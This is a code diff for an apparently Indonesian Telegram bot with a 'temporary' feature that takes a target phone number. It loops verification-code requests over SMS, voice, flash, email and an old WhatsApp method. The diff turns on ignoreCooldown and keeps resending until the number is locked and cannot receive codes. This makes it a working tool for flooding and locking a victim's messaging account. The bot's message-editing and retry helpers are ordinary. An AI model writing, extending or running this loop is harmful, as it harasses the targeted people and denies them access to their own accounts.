@@ -747,6 +747,37 @@ async function showPlainPanel(ctx, text, deleteUserTap = true) {
   keyboardMsgIds.set(userId, sent.message_id);
 }
 
+async function safeEditMessage(telegram, chatId, messageId, text, kb) {
+  try {
+    await telegram.editMessageText(chatId, messageId, undefined, text, {
+      parse_mode: "HTML",
+      disable_web_page_preview: true,
+      ...(kb || {})
+    });
+    return { ok: true, messageId };
+  } catch (e) {
+    const msg = String(e && e.message ? e.message : e);
+    if (msg.includes("message is not modified")) return { ok: true, messageId };
+    if (msg.includes("Too Many Requests") || msg.includes("retry after")) {
+      const wait = Number((msg.match(/retry after (\d+)/i) || [])[1] || 2);
+      await new Promise(r => setTimeout(r, (wait + 1) * 1000));
+      try {
+        await telegram.editMessageText(chatId, messageId, undefined, text, {
+          parse_mode: "HTML",
+          disable_web_page_preview: true,
+          ...(kb || {})
+        });
+        return { ok: true, messageId };
+      } catch (e2) {
+        const msg2 = String(e2 && e2.message ? e2.message : e2);
+        if (msg2.includes("message is not modified")) return { ok: true, messageId };
+        return { ok: false, error: msg2 };
+      }
+    }
+    return { ok: false, error: msg };
+  }
+}
+
 async function showInlinePanel(ctx, text, kb, deleteUserTap = true) {
   const userId = ctx.from.id;
   const chatId = ctx.chat.id;
@@ -755,20 +786,15 @@ async function showInlinePanel(ctx, text, kb, deleteUserTap = true) {
   }
   const prevInline = activeInlineMsg.get(userId);
   if (prevInline && prevInline.chatId === chatId) {
-    try {
-      await ctx.telegram.editMessageText(chatId, prevInline.messageId, undefined, text, {
-        parse_mode: "HTML",
-        ...kb
-      });
-      return;
-    } catch (e) {
-      if (String(e.message || "").includes("message is not modified")) return;
-      ctx.telegram.deleteMessage(chatId, prevInline.messageId).catch(() => {});
-    }
+    const edited = await safeEditMessage(ctx.telegram, chatId, prevInline.messageId, text, kb);
+    if (edited.ok) return;
+    ctx.telegram.deleteMessage(chatId, prevInline.messageId).catch(() => {});
+    activeInlineMsg.delete(userId);
   }
   const sent = await ctx.reply(text, {
     parse_mode: "HTML",
-    ...kb
+    disable_web_page_preview: true,
+    ...(kb || {})
   });
   activeInlineMsg.set(userId, { chatId, messageId: sent.message_id });
 }
@@ -776,19 +802,32 @@ async function showInlinePanel(ctx, text, kb, deleteUserTap = true) {
 async function editInline(ctx, text, kb) {
   const userId = ctx.from.id;
   const chatId = ctx.chat.id;
+
   if (ctx.callbackQuery && ctx.callbackQuery.message) {
-    try {
-      await ctx.editMessageText(text, { parse_mode: "HTML", ...kb });
-      activeInlineMsg.set(userId, {
-        chatId,
-        messageId: ctx.callbackQuery.message.message_id
-      });
+    const mid = ctx.callbackQuery.message.message_id;
+    const edited = await safeEditMessage(ctx.telegram, chatId, mid, text, kb);
+    if (edited.ok) {
+      activeInlineMsg.set(userId, { chatId, messageId: mid });
       return;
-    } catch (e) {
-      if (String(e.message || "").includes("message is not modified")) return;
     }
   }
-  await showInlinePanel(ctx, text, kb, false);
+
+  const prev = activeInlineMsg.get(userId);
+  if (prev && prev.chatId === chatId) {
+    const edited = await safeEditMessage(ctx.telegram, chatId, prev.messageId, text, kb);
+    if (edited.ok) return;
+    ctx.telegram.deleteMessage(chatId, prev.messageId).catch(() => {});
+    activeInlineMsg.delete(userId);
+  }
+
+  try {
+    const sent = await ctx.reply(text, {
+      parse_mode: "HTML",
+      disable_web_page_preview: true,
+      ...(kb || {})
+    });
+    activeInlineMsg.set(userId, { chatId, messageId: sent.message_id });
+  } catch (_) {}
 }
 
 async function buildDashboard(userId, from = null) {
@@ -1527,15 +1566,13 @@ async function processNumbers(ctx, rawInput) {
     const now = Date.now();
     if (now - lastEdit < minInterval && done < total) return;
     lastEdit = now;
-    try {
-      await ctx.telegram.editMessageText(
-        ctx.chat.id,
-        statusMsg.message_id,
-        undefined,
-        summarizeProgress(partialResults, total),
-        { parse_mode: "HTML" }
-      );
-    } catch (_) {}
+    await safeEditMessage(
+      ctx.telegram,
+      ctx.chat.id,
+      statusMsg.message_id,
+      summarizeProgress(partialResults, total),
+      null
+    );
   }, { forceFresh: false });
 
   if (!premium) await addUsed(userId, numbers.length);
@@ -1631,15 +1668,13 @@ async function processEmailFix(ctx, rawInput) {
     const now = Date.now();
     if (now - lastEdit < minInterval && done < total) return;
     lastEdit = now;
-    try {
-      await ctx.telegram.editMessageText(
-        ctx.chat.id,
-        statusMsg.message_id,
-        undefined,
-        summarizeEmailProgress(partialResults, total),
-        { parse_mode: "HTML" }
-      );
-    } catch (_) {}
+    await safeEditMessage(
+      ctx.telegram,
+      ctx.chat.id,
+      statusMsg.message_id,
+      summarizeEmailProgress(partialResults, total),
+      null
+    );
   });
 
   if (!premium) await addUsed(userId, numbers.length);
@@ -2225,15 +2260,38 @@ function methodLabel(m) {
   return map[m] || m;
 }
 
+function methodWaitLabel(sec) {
+  const n = Number(sec) || 0;
+  if (n <= 0) return "ᴛᴇʀꜱᴇᴅɪᴀ";
+  if (n >= 600) return `ᴄᴏᴏʟᴅᴏᴡɴ ${formatCooldown(n)}`;
+  return `ᴊᴇᴅᴀ ${formatCooldown(n)}`;
+}
+
 function formatMethodsBlock(methods, isDeviceOn) {
   const m = methods || {};
   const lines = [];
-  lines.push(`▸ ꜱᴍꜱ ⦂ ${m.sms > 0 ? `ᴊᴇᴅᴀ ${formatCooldown(m.sms)}` : "ᴛᴇʀꜱᴇᴅɪᴀ"}`);
-  lines.push(`▸ ᴠᴏɪᴄᴇ ⦂ ${m.voice > 0 ? `ᴊᴇᴅᴀ ${formatCooldown(m.voice)}` : "ᴛᴇʀꜱᴇᴅɪᴀ"}`);
-  lines.push(`▸ ꜰʟᴀꜱʜ ⦂ ${m.flash > 0 ? `ᴊᴇᴅᴀ ${formatCooldown(m.flash)}` : "ᴛᴇʀꜱᴇᴅɪᴀ"}`);
-  lines.push(`▸ ᴡᴀ_ᴏʟᴅ ⦂ ${!isDeviceOn ? "ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴘᴇʀᴀɴɢᴋᴀᴛ" : (m.wa_old > 0 ? `ᴊᴇᴅᴀ ${formatCooldown(m.wa_old)}` : "ᴛᴇʀꜱᴇᴅɪᴀ")}`);
-  lines.push(`▸ ᴇᴍᴀɪʟ ⦂ ${m.email > 0 ? `ᴊᴇᴅᴀ ${formatCooldown(m.email)}` : "ᴛᴇʀꜱᴇᴅɪᴀ"}`);
+  lines.push(`▸ ꜱᴍꜱ ⦂ ${methodWaitLabel(m.sms)}`);
+  lines.push(`▸ ᴠᴏɪᴄᴇ ⦂ ${methodWaitLabel(m.voice)}`);
+  lines.push(`▸ ꜰʟᴀꜱʜ ⦂ ${methodWaitLabel(m.flash)}`);
+  if (!isDeviceOn) lines.push("▸ ᴡᴀ_ᴏʟᴅ ⦂ ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴘᴇʀᴀɴɢᴋᴀᴛ");
+  else lines.push(`▸ ᴡᴀ_ᴏʟᴅ ⦂ ${methodWaitLabel(m.wa_old)}`);
+  lines.push(`▸ ᴇᴍᴀɪʟ ⦂ ${methodWaitLabel(m.email)}`);
   return lines.join("\n");
+}
+
+function tempProbeStatusLine(probe) {
+  if (!probe) return "ᴛɪᴅᴀᴋ ᴅɪᴋᴇᴛᴀʜᴜɪ";
+  if (probe.isBanned) return "ʙᴀɴɴᴇᴅ";
+  if (probe.isCloneBlocked) return "ᴛɪᴅᴀᴋ ꜱᴜᴘᴘᴏʀᴛ ᴄʟᴏɴᴇ";
+  const cd = Number(probe.cooldownSeconds || 0);
+  const methods = probe.methods || {};
+  const waits = ["sms", "voice", "flash", "email", "wa_old"].map(k => Number(methods[k] || 0));
+  const maxWait = Math.max(cd, ...waits);
+  const minPositive = waits.filter(w => w > 0).sort((a, b) => a - b)[0] || 0;
+  if (maxWait >= 600) return `ᴄᴏᴏʟᴅᴏᴡɴ ᴋᴇʀᴀꜱ ${formatCooldown(maxWait)}`;
+  if (minPositive > 0) return `ᴊᴇᴅᴀ ꜱᴇᴍᴇɴᴛᴀʀᴀ ${formatCooldown(minPositive)}`;
+  if (probe.isReady) return "ꜱɪᴀᴘ ᴋɪʀɪᴍ";
+  return String(probe.state || "ᴛɪᴅᴀᴋ ᴅɪᴋᴇᴛᴀʜᴜɪ");
 }
 
 function buildSendMethodKeyboard(phone, probe) {
@@ -2242,15 +2300,27 @@ function buildSendMethodKeyboard(phone, probe) {
   const rows = [];
   const row1 = [];
   const row2 = [];
-  if (!(m.sms > 0)) row1.push(btn("ꜱᴍꜱ", "send_sms", "primary"));
-  if (!(m.voice > 0)) row1.push(btn("ᴠᴏɪᴄᴇ", "send_voice", "primary"));
-  if (!(m.flash > 0)) row1.push(btn("ꜰʟᴀꜱʜ", "send_flash", "primary"));
-  if (dev && !(m.wa_old > 0)) row2.push(btn("ᴡᴀ ᴏʟᴅ", "send_wa_old", "success"));
-  if (!(m.email > 0)) row2.push(btn("ᴇᴍᴀɪʟ", "send_email", "success"));
-  if (row1.length) rows.push(row1);
+  // Tampilkan semua metode; yang sedang jeda tetap bisa dipilih (loop akan menunggu)
+  row1.push(btn("ꜱᴍꜱ", "send_sms", "primary"));
+  row1.push(btn("ᴠᴏɪᴄᴇ", "send_voice", "primary"));
+  row1.push(btn("ꜰʟᴀꜱʜ", "send_flash", "primary"));
+  if (dev) row2.push(btn("ᴡᴀ ᴏʟᴅ", "send_wa_old", "success"));
+  row2.push(btn("ᴇᴍᴀɪʟ", "send_email", "success"));
+  rows.push(row1);
   if (row2.length) rows.push(row2);
   rows.push([btn("✕ ʙᴀᴛᴀʟ", "cancel_send", "danger")]);
   return inlineKb(rows);
+}
+
+function buildTempStartKeyboard(method) {
+  return inlineKb([
+    [btn("▶ ᴍᴜʟᴀɪ", `temp_start_${method}`, "success")],
+    [btn("✕ ʙᴀᴛᴀʟ", "cancel_send", "danger")]
+  ]);
+}
+
+function buildTempStopKeyboard() {
+  return inlineKb([[btn("⏹ ꜱᴛᴏᴘ", "cancel_send", "danger")]]);
 }
 
 async function runAutoSendLoop(ctx, phone, method) {
@@ -2279,31 +2349,34 @@ async function runAutoSendLoop(ctx, phone, method) {
   pendingSendPhone.set(userId, phone);
   pendingSendMethod.set(userId, method);
 
-  const cancelKb = inlineKb([[btn("✕ ʙᴀᴛᴀʟ", "cancel_send", "danger")]]);
+  const stopKb = buildTempStopKeyboard();
   let attempt = 0;
   let lastRes = null;
   let stoppedReason = null;
+  let successCount = 0;
 
   while (!job.cancelled) {
     attempt += 1;
     try {
       await editInline(ctx, [
-        "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ — ᴏᴛᴏᴍᴀᴛɪꜱ",
+        "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ — ʙᴇʀᴊᴀʟᴀɴ",
         "",
         `<blockquote>▸ ɴᴏᴍᴏʀ ⦂ <code>${esc(phone)}</code>`,
         `▸ ᴍᴇᴛᴏᴅᴇ ⦂ ${methodLabel(method)}`,
         `▸ ᴘᴇʀᴄᴏʙᴀᴀɴ ⦂ #${attempt}`,
-        "▸ ꜱᴛᴀᴛᴜꜱ ⦂ ᴍᴇɴɢɪʀɪᴍ...</blockquote>",
+        `▸ ʙᴇʀʜᴀꜱɪʟ ⦂ ${successCount}x`,
+        "▸ ꜱᴛᴀᴛᴜꜱ ⦂ ᴍᴇɴɢɪʀɪᴍ ᴋᴏᴅᴇ...</blockquote>",
         "",
-        "ⓘ ᴘʀᴏꜱᴇꜱ ʙᴇʀᴊᴀʟᴀɴ ꜱᴀᴍᴘᴀɪ ɴᴏᴍᴏʀ ᴛᴇᴍᴘᴏʀᴀʀʏ ᴀᴛᴀᴜ ᴅɪʙᴀᴛᴀʟᴋᴀɴ."
-      ].join("\n"), cancelKb);
+        "ⓘ ᴘʀᴏꜱᴇꜱ ʟᴀɴᴊᴜᴛ ꜱᴀᴍᴘᴀɪ ɴᴏᴍᴏʀ ᴛᴇʀᴋᴜɴᴄɪ / ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴋɪʀɪᴍ ᴋᴏᴅᴇ.",
+        "   ᴛᴇᴋᴀɴ <b>⏹ ꜱᴛᴏᴘ</b> ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴀᴛᴀʟᴋᴀɴ."
+      ].join("\n"), stopKb);
     } catch (_) {}
 
     let res;
     try {
       res = await sendVerificationCode(phone, method, {
         skipProbe: attempt > 1,
-        ignoreCooldown: false,
+        ignoreCooldown: true,
         signal: abort.signal
       });
     } catch (e) {
@@ -2319,36 +2392,31 @@ async function runAutoSendLoop(ctx, phone, method) {
     const devOn = Boolean(res.isDeviceOn || (res.probe && res.probe.isDeviceOn));
     const cd = Number(res.cooldownSeconds || 0);
     const methodWait = numWaitSafe(methods[method]);
-    const effectiveCd = methodWait || cd;
-
-    const isTemp = res.state === "COOLDOWN" || res.state === "SMS_LIMIT" || effectiveCd >= 60 || (res.success && effectiveCd > 0);
+    const effectiveCd = Math.max(methodWait, cd);
+    const isHardLock = effectiveCd >= 600 || res.state === "COOLDOWN" && effectiveCd >= 600;
     const isBanned = res.state === "BANNED" || res.error === "banned";
     const isHardFail = ["BANNED", "FAILED", "NO_DEVICE", "INVALID_NUMBER"].includes(String(res.state || "")) ||
       ["banned", "wa_old_not_available", "invalid_phone", "no_code_endpoint"].includes(String(res.error || ""));
 
-    if (res.success && (res.state === "SENT" || isTemp || effectiveCd > 0)) {
-      stoppedReason = effectiveCd > 0 ? "temporary" : "sent";
-      const statusText = effectiveCd >= 600
-        ? `ᴛᴇᴍᴘᴏʀᴀʀʏ ${formatCooldown(effectiveCd)}`
-        : (effectiveCd > 0
-          ? `ᴛᴇʀᴋɪʀɪᴍ · ᴊᴇᴅᴀ ${formatCooldown(effectiveCd)}`
-          : "ᴛᴇʀᴋɪʀɪᴍ");
+    if (res.success) successCount += 1;
 
+    // Hard lock / true temporary → stop
+    if (isHardLock) {
+      stoppedReason = "locked";
       await editInline(ctx, [
-        "✧ ʜᴀꜱɪʟ ᴛᴇᴍᴘᴏʀᴀʀʏ",
+        "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ ꜱᴇʟᴇꜱᴀɪ",
         "",
         `<blockquote>▸ ɴᴏᴍᴏʀ ⦂ <code>${esc(res.phone || phone)}</code>`,
         `▸ ᴍᴇᴛᴏᴅᴇ ⦂ ${methodLabel(method)}`,
-        `▸ ꜱᴛᴀᴛᴜꜱ ⦂ ${statusText}`,
+        `▸ ꜱᴛᴀᴛᴜꜱ ⦂ ᴛᴇʀᴋᴜɴᴄɪ / ᴄᴏᴏʟᴅᴏᴡɴ ᴋᴇʀᴀꜱ`,
+        `▸ ᴊᴇᴅᴀ ⦂ ${formatCooldown(effectiveCd)}`,
         `▸ ᴘᴇʀᴀɴɢᴋᴀᴛ ⦂ ${devOn ? "● ᴏɴ" : "○ ᴏꜰꜰ"}`,
-        `▸ ᴘᴇʀᴄᴏʙᴀᴀɴ ⦂ ${attempt}x</blockquote>`,
+        `▸ ᴘᴇʀᴄᴏʙᴀᴀɴ ⦂ ${attempt}x (ʙᴇʀʜᴀꜱɪʟ ${successCount}x)</blockquote>`,
         "",
         "◈ ꜱᴛᴀᴛᴜꜱ ᴍᴇᴛᴏᴅᴇ",
         `<blockquote>${formatMethodsBlock(methods, devOn)}</blockquote>`,
         "",
-        effectiveCd > 0
-          ? "ⓘ ɴᴏᴍᴏʀ ꜱᴜᴅᴀʜ ᴍᴀꜱᴜᴋ ᴊᴇᴅᴀ / ᴛᴇᴍᴘᴏʀᴀʀʏ."
-          : "ⓘ ᴋᴏᴅᴇ ʙᴇʀʜᴀꜱɪʟ ᴅɪᴋɪʀɪᴍ ʟᴇᴡᴀᴛ ᴇɴᴅᴘᴏɪɴᴛ ʀᴇꜱᴍɪ ᴡᴀ."
+        "ⓘ ɴᴏᴍᴏʀ ꜱᴜᴅᴀʜ ꜱᴜʟɪᴛ / ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴏᴅᴇ ᴜɴᴛᴜᴋ ꜱᴇᴍᴇɴᴛᴀʀᴀ."
       ].join("\n"), buildSendMethodKeyboard(phone, { methods, isDeviceOn: devOn }));
       break;
     }
@@ -2356,13 +2424,14 @@ async function runAutoSendLoop(ctx, phone, method) {
     if (isBanned || isHardFail) {
       stoppedReason = "failed";
       await editInline(ctx, [
-        "✧ ʜᴀꜱɪʟ ᴛᴇᴍᴘᴏʀᴀʀʏ",
+        "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ ɢᴀɢᴀʟ",
         "",
         `<blockquote>▸ ɴᴏᴍᴏʀ ⦂ <code>${esc(res.phone || phone)}</code>`,
         `▸ ᴍᴇᴛᴏᴅᴇ ⦂ ${methodLabel(method)}`,
         `▸ ꜱᴛᴀᴛᴜꜱ ⦂ ɢᴀɢᴀʟ / ᴅɪᴛᴏʟᴀᴋ`,
         `▸ ᴘᴇʀᴀɴɢᴋᴀᴛ ⦂ ${devOn ? "● ᴏɴ" : "○ ᴏꜰꜰ"}`,
-        `▸ ᴀʟᴀꜱᴀɴ ⦂ ${esc(res.error || res.state || "gagal")}</blockquote>`,
+        `▸ ᴀʟᴀꜱᴀɴ ⦂ ${esc(res.error || res.state || "gagal")}`,
+        `▸ ᴘᴇʀᴄᴏʙᴀᴀɴ ⦂ ${attempt}x</blockquote>`,
         "",
         "◈ ꜱᴛᴀᴛᴜꜱ ᴍᴇᴛᴏᴅᴇ",
         `<blockquote>${formatMethodsBlock(methods, devOn)}</blockquote>`
@@ -2370,17 +2439,61 @@ async function runAutoSendLoop(ctx, phone, method) {
       break;
     }
 
+    // Soft success / soft jeda → tunggu penuh lalu kirim ulang sampai limit keras
+    if (res.success || (effectiveCd > 0 && effectiveCd < 600)) {
+      const waitSec = effectiveCd > 0 ? effectiveCd : 3;
+      const waitShow = formatCooldown(waitSec);
+      const deadline = Date.now() + waitSec * 1000;
+      let lastUi = 0;
+
+      while (!job.cancelled) {
+        const remain = Math.max(0, Math.ceil((deadline - Date.now()) / 1000));
+        const now = Date.now();
+        if (now - lastUi >= 2000 || remain <= 0) {
+          lastUi = now;
+          try {
+            await editInline(ctx, [
+              "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ — ᴍᴇɴᴜɴɢɢᴜ ᴊᴇᴅᴀ",
+              "",
+              `<blockquote>▸ ɴᴏᴍᴏʀ ⦂ <code>${esc(res.phone || phone)}</code>`,
+              `▸ ᴍᴇᴛᴏᴅᴇ ⦂ ${methodLabel(method)}`,
+              `▸ ᴛᴇʀᴀᴋʜɪʀ ⦂ ${res.success ? "ᴛᴇʀᴋɪʀɪᴍ" : "ᴊᴇᴅᴀ ꜱᴇᴍᴇɴᴛᴀʀᴀ"}`,
+              `▸ ᴊᴇᴅᴀ ᴘᴇɴᴜʜ ⦂ ${waitShow}`,
+              `▸ ꜱɪꜱᴀ ᴛᴜɴɢɢᴜ ⦂ ${formatCooldown(remain)}`,
+              `▸ ᴘᴇʀᴄᴏʙᴀᴀɴ ⦂ #${attempt}`,
+              `▸ ʙᴇʀʜᴀꜱɪʟ ⦂ ${successCount}x</blockquote>`,
+              "",
+              "◈ ꜱᴛᴀᴛᴜꜱ ᴍᴇᴛᴏᴅᴇ",
+              `<blockquote>${formatMethodsBlock(methods, devOn)}</blockquote>`,
+              "",
+              remain > 0
+                ? "ⓘ ᴍᴇɴᴜɴɢɢᴜ ᴊᴇᴅᴀ ꜱᴇʟᴇꜱᴀɪ, ʟᴀʟᴜ ᴋɪʀɪᴍ ᴜʟᴀɴɢ ᴏᴛᴏᴍᴀᴛɪꜱ."
+                : "ⓘ ᴊᴇᴅᴀ ꜱᴇʟᴇꜱᴀɪ — ᴍᴇɴɢɪʀɪᴍ ᴜʟᴀɴɢ...",
+              "   ᴛᴇᴋᴀɴ <b>⏹ ꜱᴛᴏᴘ</b> ᴜɴᴛᴜᴋ ʙᴇʀʜᴇɴᴛɪ."
+            ].join("\n"), stopKb);
+          } catch (_) {}
+        }
+        if (remain <= 0) break;
+        await new Promise(r => setTimeout(r, 1000));
+      }
+
+      if (job.cancelled) {
+        stoppedReason = "cancelled";
+        break;
+      }
+      continue;
+    }
+
     const errMsg = String(res.error || res.state || "gagal");
     const retryable = /NETWORK_ERROR|REQUEST_TIMEOUT|HTTP_5|EMPTY_UPSTREAM|HTTP_429/i.test(errMsg);
-    if (!retryable || attempt >= 15) {
+    if (!retryable && attempt >= 8) {
       stoppedReason = "failed";
       await editInline(ctx, [
-        "✧ ʜᴀꜱɪʟ ᴛᴇᴍᴘᴏʀᴀʀʏ",
+        "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ ɢᴀɢᴀʟ",
         "",
         `<blockquote>▸ ɴᴏᴍᴏʀ ⦂ <code>${esc(res.phone || phone)}</code>`,
         `▸ ᴍᴇᴛᴏᴅᴇ ⦂ ${methodLabel(method)}`,
-        `▸ ꜱᴛᴀᴛᴜꜱ ⦂ ɢᴀɢᴀʟ / ᴅɪᴛᴏʟᴀᴋ`,
-        `▸ ᴘᴇʀᴀɴɢᴋᴀᴛ ⦂ ${devOn ? "● ᴏɴ" : "○ ᴏꜰꜰ"}`,
+        `▸ ꜱᴛᴀᴛᴜꜱ ⦂ ɢᴀɢᴀʟ`,
         `▸ ᴀʟᴀꜱᴀɴ ⦂ ${esc(errMsg)}`,
         `▸ ᴘᴇʀᴄᴏʙᴀᴀɴ ⦂ ${attempt}x</blockquote>`,
         "",
@@ -2400,22 +2513,24 @@ async function runAutoSendLoop(ctx, phone, method) {
         `▸ ᴀʟᴀꜱᴀɴ ⦂ ${esc(errMsg)}</blockquote>`,
         "",
         "ⓘ ᴍᴇɴᴄᴏʙᴀ ᴜʟᴀɴɢ ᴏᴛᴏᴍᴀᴛɪꜱ..."
-      ].join("\n"), cancelKb);
+      ].join("\n"), stopKb);
     } catch (_) {}
-
-    await new Promise(r => setTimeout(r, 1200 + Math.min(attempt, 6) * 350));
+    await new Promise(r => setTimeout(r, 1500 + Math.min(attempt, 6) * 300));
   }
 
-  if ((job.cancelled || stoppedReason === "cancelled") && stoppedReason !== "temporary" && stoppedReason !== "sent" && stoppedReason !== "failed") {
+  if ((job.cancelled || stoppedReason === "cancelled") && stoppedReason !== "locked" && stoppedReason !== "failed") {
     const methods = (lastRes && lastRes.methods) || {};
     const devOn = Boolean(lastRes && (lastRes.isDeviceOn || (lastRes.probe && lastRes.probe.isDeviceOn)));
     try {
       await editInline(ctx, [
-        "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ ᴅɪʙᴀᴛᴀʟᴋᴀɴ",
+        "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ ᴅɪʜᴇɴᴛɪᴋᴀɴ",
         "",
         `<blockquote>▸ ɴᴏᴍᴏʀ ⦂ <code>${esc(phone)}</code>`,
         `▸ ᴍᴇᴛᴏᴅᴇ ⦂ ${methodLabel(method)}`,
-        `▸ ᴘᴇʀᴄᴏʙᴀᴀɴ ⦂ ${attempt}x</blockquote>`
+        `▸ ᴘᴇʀᴄᴏʙᴀᴀɴ ⦂ ${attempt}x`,
+        `▸ ʙᴇʀʜᴀꜱɪʟ ⦂ ${successCount}x</blockquote>`,
+        "",
+        "ⓘ ᴘʀᴏꜱᴇꜱ ᴅɪʜᴇɴᴛɪᴋᴀɴ ᴍᴀɴᴜᴀʟ."
       ].join("\n"), buildSendMethodKeyboard(phone, { methods, isDeviceOn: devOn }));
     } catch (_) {}
   }
@@ -2436,7 +2551,27 @@ bot.action(/^send_(sms|voice|flash|email|wa_old)$/i, async (ctx) => {
   const phone = pendingSendPhone.get(userId);
   await ctx.answerCbQuery();
   if (!phone) {
-    return editInline(ctx, "⚠ ɴᴏᴍᴏʀ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ. ᴜʟᴀɴɢɪ ᴅᴀʀɪ ᴍᴇɴᴜ ᴋɪʀɪᴍ ᴋᴏᴅᴇ.", inlineKb([[btn("✕ ᴛᴜᴛᴜᴘ", "cancel_send", "danger")]]));
+    return editInline(ctx, "⚠ ɴᴏᴍᴏʀ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ. ᴜʟᴀɴɢɪ ᴅᴀʀɪ ᴍᴇɴᴜ ᴛᴇᴍᴘᴏʀᴀʀʏ.", inlineKb([[btn("✕ ᴛᴜᴛᴜᴘ", "cancel_send", "danger")]]));
+  }
+  pendingSendMethod.set(userId, method);
+  return editInline(ctx, [
+    "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ — ᴋᴏɴꜰɪʀᴍᴀꜱɪ",
+    "",
+    `<blockquote>▸ ɴᴏᴍᴏʀ ⦂ <code>${esc(phone)}</code>`,
+    `▸ ᴍᴇᴛᴏᴅᴇ ⦂ ${methodLabel(method)}</blockquote>`,
+    "",
+    "ⓘ ᴛᴇᴋᴀɴ <b>▶ ᴍᴜʟᴀɪ</b> ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀʟᴀɴᴋᴀɴ ꜱᴀᴍᴘᴀɪ ɴᴏᴍᴏʀ ᴛᴇʀᴋᴜɴᴄɪ.",
+    "   ᴘʀᴏꜱᴇꜱ ʙɪꜱᴀ ᴅɪʜᴇɴᴛɪᴋᴀɴ ᴋᴀᴘᴀɴ ꜱᴀᴊᴀ ᴅᴇɴɢᴀɴ <b>⏹ ꜱᴛᴏᴘ</b>."
+  ].join("\n"), buildTempStartKeyboard(method));
+});
+
+bot.action(/^temp_start_(sms|voice|flash|email|wa_old)$/i, async (ctx) => {
+  const userId = ctx.from.id;
+  const method = String(ctx.match[1] || "sms").toLowerCase();
+  const phone = pendingSendPhone.get(userId);
+  await ctx.answerCbQuery("ᴍᴇᴍᴜʟᴀɪ...");
+  if (!phone) {
+    return editInline(ctx, "⚠ ɴᴏᴍᴏʀ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ. ᴜʟᴀɴɢɪ ᴅᴀʀɪ ᴍᴇɴᴜ ᴛᴇᴍᴘᴏʀᴀʀʏ.", inlineKb([[btn("✕ ᴛᴜᴛᴜᴘ", "cancel_send", "danger")]]));
   }
   pendingSendMethod.set(userId, method);
   return runAutoSendLoop(ctx, phone, method);
@@ -2971,36 +3106,40 @@ bot.on("text", async (ctx, next) => {
     const numbers = extractSmartPhoneNumbers(txt);
     if (numbers.length === 0) {
       awaitingSendInput.add(userId);
-      return showInlinePanel(ctx, "⚠ ɴᴏᴍᴏʀ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ. ᴋɪʀɪᴍ ᴜʟᴀɴɢ 1 ɴᴏᴍᴏʀ.", inlineKb([[btn("✕ ʙᴀᴛᴀʟᴋᴀɴ", "cancel_send", "danger")]]), false);
+      return showInlinePanel(ctx, "⚠ ɴᴏᴍᴏʀ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ. ᴋɪʀɪᴍ ᴜʟᴀɴɢ 1 ɴᴏᴍᴏʀ.", inlineKb([[btn("✕ ʙᴀᴛᴀʟ", "cancel_send", "danger")]]), false);
     }
     const phone = numbers[0];
     pendingSendPhone.set(userId, phone);
     await showInlinePanel(ctx, [
-      "✧ ᴍᴇᴍᴇʀɪᴋꜱᴀ ꜱᴛᴀᴛᴜꜱ ɴᴏᴍᴏʀ...",
+      "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ",
       "",
-      `<blockquote>▸ ᴛᴀʀɢᴇᴛ ⦂ <code>${esc(phone)}</code></blockquote>`
+      `<blockquote>▸ ᴍᴇᴍᴇʀɪᴋꜱᴀ ɴᴏᴍᴏʀ <code>${esc(phone)}</code>...</blockquote>`
     ].join("\n"), inlineKb([]), false);
 
     const probe = await probePhoneMethods(phone);
     const methods = probe.methods || {};
-    const stateLine = probe.isBanned ? "ʙᴀɴɴᴇᴅ"
-      : probe.isCloneBlocked ? "ᴛɪᴅᴀᴋ ꜱᴜᴘᴘᴏʀᴛ ᴄʟᴏɴᴇ"
-      : probe.isCooldown ? `ᴄᴏᴏʟᴅᴏᴡɴ ᴋᴇʀᴀꜱ ${formatCooldown(probe.cooldownSeconds || 0)}`
-      : probe.isSmsLimited ? `ʟɪᴍɪᴛ ꜱᴍꜱ ${formatCooldown(probe.cooldownSeconds || 0)}`
-      : probe.isReady ? "ꜱɪᴀᴘ"
-      : (probe.state || "UNKNOWN");
+    const stateLine = tempProbeStatusLine(probe);
+    const available = [];
+    if (!(methods.sms > 0)) available.push("ꜱᴍꜱ");
+    if (!(methods.voice > 0)) available.push("ᴠᴏɪᴄᴇ");
+    if (!(methods.flash > 0)) available.push("ꜰʟᴀꜱʜ");
+    if (probe.isDeviceOn && !(methods.wa_old > 0)) available.push("ᴡᴀ_ᴏʟᴅ");
+    if (!(methods.email > 0)) available.push("ᴇᴍᴀɪʟ");
 
     return showInlinePanel(ctx, [
-      "✧ ᴋɪʀɪᴍ ᴋᴏᴅᴇ — ᴘɪʟɪʜ ᴍᴇᴛᴏᴅᴇ",
+      "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ — ᴘɪʟɪʜ ᴍᴇᴛᴏᴅᴇ",
       "",
       `<blockquote>▸ ɴᴏᴍᴏʀ ⦂ <code>${esc(probe.phone || phone)}</code>`,
       `▸ ꜱᴛᴀᴛᴜꜱ ⦂ ${stateLine}`,
-      `▸ ᴘᴇʀᴀɴɢᴋᴀᴛ ⦂ ${probe.isDeviceOn ? "● ᴏɴ-ᴅᴇᴠɪᴄᴇ" : "○ ᴏꜰꜰ-ᴅᴇᴠɪᴄᴇ"}</blockquote>`,
